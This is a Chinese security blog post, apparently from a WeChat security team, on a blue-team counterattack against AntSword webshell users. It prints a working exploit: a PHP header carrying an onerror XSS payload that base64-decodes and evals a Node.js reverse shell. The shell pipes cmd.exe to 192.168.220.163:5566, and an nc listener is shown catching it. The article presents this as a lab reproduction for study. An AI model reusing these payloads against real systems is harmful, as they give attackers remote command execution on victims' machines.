<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/1ML-BggccBSL62Kquqcv6Q)

![](https://mmbiz.qpic.cn/mmbiz_png/ia2e3fjFicWdRtiaubdaFGxphKCSiaAVXbxwqWTicJLRMZjcXEhKjyvkUruqdyrmmc0QNksIRBwpjicaCFNtHRdiabEeg/640)

目标

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7fB9q0JGS1YnhzvQ0WlTQMRdb0XVYRZOsdHd93tW3JmGjQn0ZuzlwNGOib32ULDue2QOENztfFy2cweuiaYCzuMg/640)

BEGINNING OF WINTER

蓝队通过修改后门的代码实现获得蚁剑使用者的权限  

![](https://mmbiz.qpic.cn/mmbiz_png/ia2e3fjFicWdRtiaubdaFGxphKCSiaAVXbxwqWTicJLRMZjcXEhKjyvkUruqdyrmmc0QNksIRBwpjicaCFNtHRdiabEeg/640)

环境

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7fB9q0JGS1YnhzvQ0WlTQMRdb0XVYRZOsdHd93tW3JmGjQn0ZuzlwNGOib32ULDue2QOENztfFy2cweuiaYCzuMg/640)

BEGINNING OF WINTER

红方：Windows Antsword                              蓝方：Linux Web

![](https://mmbiz.qpic.cn/mmbiz_png/ia2e3fjFicWdRtiaubdaFGxphKCSiaAVXbxwqWTicJLRMZjcXEhKjyvkUruqdyrmmc0QNksIRBwpjicaCFNtHRdiabEeg/640)

复现  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7fB9q0JGS1YnhzvQ0WlTQMRdb0XVYRZOsdHd93tW3JmGjQn0ZuzlwNGOib32ULDue2QOENztfFy2cweuiaYCzuMg/640)

BEGINNING OF WINTER

原理：

```
<?php
header('HTTP/1.1 500 <img src=# onerror=alert(1)>');

```

Nodejs 代码：

```
var net = require("net"), sh = require("child_process").exec("cmd.exe");
var client = new net.Socket();
client.connect(5566, "192.168.220.163", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});

```

编码组合后：

```
<?php
header("HTTP/1.1 500 Not <img src=# onerror='eval(new Buffer(`dmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpLCBzaCA9IHJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjKCJjbWQuZXhlIik7CnZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOwpjbGllbnQuY29ubmVjdCg1NTY2LCAiMTkyLjE2OC4yMjAuMTYzIiwgZnVuY3Rpb24oKXtjbGllbnQucGlwZShzaC5zdGRpbik7c2guc3Rkb3V0LnBpcGUoY2xpZW50KTtzaC5zdGRlcnIucGlwZShjbGllbnQpO30pOw==`,`base64`).toString())'>");

```

将上述页面放于红队的一句话木马中。等待红队连接。

kali 监听

```
└─# nc -lvvp 5566

```

模拟红队操作

![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4ZfOgCTKtqCylFvXGcz9tcY7aeuibl3LNMJDgSUYIKVrFG2Rhjx7FyQqwYZFuYmnmD6WSRvrVBNq0kg/640?wx_fmt=png&from=appmsg)

蓝队 kali 成功接收到反弹 shell

![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4ZfOgCTKtqCylFvXGcz9tcY7uVqNttjFaPKm24D8iadu1A0YBDSognV7XCrILgMoMwMEzpjWkgAMUdA/640?wx_fmt=png&from=appmsg)

揽月安全团队发布、转载的文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！！！！！